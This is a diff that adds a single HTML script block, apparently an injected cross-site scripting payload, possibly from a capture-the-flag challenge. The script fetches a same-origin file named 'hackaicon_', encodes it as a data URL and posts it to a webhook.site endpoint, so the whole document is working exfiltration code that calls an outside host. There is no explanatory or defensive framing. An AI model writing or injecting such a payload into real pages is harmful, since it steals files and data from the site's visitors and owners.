@@ -1,0 +1,17 @@
+<script>
+fetch('/hackaicon_')
+  .then(res => res.blob())
+  .then(blob => {
+    // Read as data URL
+    const reader = new FileReader();
+    reader.onload = () => {
+      fetch('https://webhook.site/885f8cc5-3936-4ce7-942c-85adb43cb216', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ filename: 'hackaicon_', data: reader.result })
+      });
+    };
+    reader.readAsDataURL(blob);
+  })
+  .catch(console.error);
+</script>
